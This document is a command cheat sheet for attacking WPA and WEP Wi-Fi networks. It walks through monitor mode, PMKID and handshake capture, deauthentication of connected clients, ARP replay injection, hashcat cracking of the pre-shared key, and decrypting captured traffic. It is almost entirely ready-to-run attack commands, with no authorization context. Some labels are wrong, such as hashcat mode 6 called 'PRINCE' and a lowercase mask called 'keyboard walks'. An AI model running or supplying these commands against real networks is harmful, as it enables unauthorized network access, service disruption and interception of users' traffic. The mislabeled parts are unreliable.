# WPA Attacks — PMKID, Handshake, Hashcat Handoff

---

## Adapter setup

```bash
# Verify monitor mode capability
iw list | grep -A10 "Supported interface modes"   # must include "monitor"
iw list | grep -A5 "Supported commands"           # must include "set-channel"

# Enable monitor mode
sudo airmon-ng check kill       # kill interfering processes
sudo airmon-ng start wlan0      # creates wlan0mon

# Verify
iw dev wlan0mon info | grep type   # should show "monitor"

# Set channel manually (when needed)
sudo iwconfig wlan0mon channel 6
sudo iw wlan0mon set channel 6 HT20
```

---

## Target survey

```bash
# Quick survey — all channels
sudo airodump-ng wlan0mon

# Dual-band
sudo airodump-ng --band abg wlan0mon

# Output columns:
# BSSID | PWR | Beacons | Data | CH | MB | ENC | CIPHER | AUTH | ESSID
# ENC: WPA2, WPA3, WEP, OPN
# AUTH: PSK (personal), MGT (enterprise/RADIUS), SAE (WPA3)
# CIPHER: CCMP (AES), TKIP
```

---

## PMKID attack (no client needed)

PMKID = HMAC-SHA1(PMK, "PMK Name" + AP_MAC + Client_MAC). Computed from first EAPOL frame.

```bash
# hcxdumptool >= 6.3 dropped -o, --enable_status, and --filterlist_ap/--filtermode.
# Use -w for the capture file, --rds for the realtime display, and --bpf for filters.
sudo hcxdumptool -i wlan0mon -w capture.pcapng --rds=1

# Target a specific AP via BPF (build the filter with tcpdump --dump-bpf)
sudo tcpdump -y IEEE802_11_RADIO -i wlan0mon --dump-bpf \
  "wlan addr3 aa:bb:cc:dd:ee:ff" > target.bpf
sudo hcxdumptool -i wlan0mon -w capture.pcapng --bpf=target.bpf --rds=1

# Convert for hashcat (mode 22000 is the primary output)
hcxpcapngtool -o pmkid_hash.txt capture.pcapng
# Emit companion lists in parallel (these are OUTPUT files, not filters):
hcxpcapngtool -o hash22000.txt -E essidlist.txt -I identitylist.txt -U usernamelist.txt capture.pcapng

# Verify captured PMKID/EAPOL counts
hcxpcapngtool capture.pcapng   # stderr summary shows PMKID/EAPOL frame counts

# Crack (mode 22000 — combined WPA/PMKID)
hashcat -m 22000 pmkid_hash.txt /path/to/rockyou.txt
hashcat -m 22000 pmkid_hash.txt /path/to/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 22000 pmkid_hash.txt -a 3 "?l?l?l?l?l?l?l?l"   # mask attack 8 lowercase
```

---

## Four-way handshake capture

```bash
# Step 1: Target specific AP on its channel
sudo airodump-ng -c <channel> --bssid <AP_MAC> wlan0mon -w handshake --output-format cap

# Step 2: Wait for client auth, OR force with deauth
# Targeted deauth (quieter — specific client)
sudo aireplay-ng -0 3 -a <AP_MAC> -c <client_MAC> wlan0mon

# Broadcast deauth (noisier — all clients)
sudo aireplay-ng -0 5 -a <AP_MAC> wlan0mon

# Wait for "WPA handshake: <AP_MAC>" message in airodump output

# Step 3: Verify handshake
aircrack-ng handshake*.cap   # shows "1 handshake" or eapol/anonce counts

# Step 4: Convert for hashcat
hcxpcapngtool -o hash22000.txt handshake*.cap

# Crack
hashcat -m 22000 hash22000.txt rockyou.txt
hashcat -m 22000 hash22000.txt rockyou.txt -r rules/best64.rule
```

---

## Legacy format (mode 2500 / 16800) — older captures

```bash
# Legacy PMKID (deprecated, hashcat -m 16800 pre-6.0.0):
hcxpcapngtool --pmkid=pmkid_legacy.txt capture.cap
hashcat -m 16800 pmkid_legacy.txt rockyou.txt

# Legacy 4-way handshake (deprecated hccapx, hashcat -m 2500):
hcxpcapngtool --hccapx=handshake.hccapx capture.cap
hashcat -m 2500 handshake.hccapx rockyou.txt

# Modern hashcat (>= 6.0.0) accepts everything as mode 22000 via `-o file.22000`.
```

---

## WEP cracking (legacy — rare)

```bash
# Capture IVs (need large number: 50k-500k)
sudo airodump-ng -c <ch> --bssid <AP_MAC> wlan0mon -w wep_capture

# Accelerate with ARP replay injection
sudo aireplay-ng -3 -b <AP_MAC> -h <client_MAC> wlan0mon

# Crack when enough IVs accumulated
aircrack-ng wep_capture*.cap
```

---

## Hashcat cracking strategy

```bash
# 1. Dictionary first (fastest)
hashcat -m 22000 hash.txt rockyou.txt

# 2. Dictionary + rules
hashcat -m 22000 hash.txt rockyou.txt -r rules/best64.rule
hashcat -m 22000 hash.txt rockyou.txt -r rules/d3ad0ne.rule

# 3. Target-specific wordlist (SSID-based)
# Wi-Fi passwords often: SSIDname + year, SSIDname123!, street address
echo "TargetSSID2023" > custom_words.txt
echo "TargetSSID2024!" >> custom_words.txt
hashcat -m 22000 hash.txt custom_words.txt

# 4. Mask attack — 8-digit numbers (ISP defaults)
hashcat -m 22000 hash.txt -a 3 "?d?d?d?d?d?d?d?d"

# 5. Keyboard walks (common for router defaults)
hashcat -m 22000 hash.txt -a 3 "?l?l?l?l?l?l?l?l" --increment --increment-min=8

# 6. PRINCE attack (combinatorial)
hashcat -m 22000 hash.txt -a 6 rockyou.txt "?d?d?d?d"  # word + 4 digits

# See cracking-technique for full strategy selection
```

---

## Wireshark handshake validation

```bash
# Filter for EAPOL (WPA handshake) frames
# Wireshark filter: eapol
# Need: Message 1 + 2, or 2 + 3 (any two consecutive)

# Decrypt WPA traffic in Wireshark after cracking:
# Edit → Preferences → Protocols → IEEE 802.11
# Add decryption key: wpa-pwd:<PSK>:<SSID>

# Or via tshark
tshark -r capture.cap -o "wlan.enable_decryption:TRUE" \
  -o "uat:80211_keys:\"wpa-pwd\",\"<PSK>:<SSID>\""
```
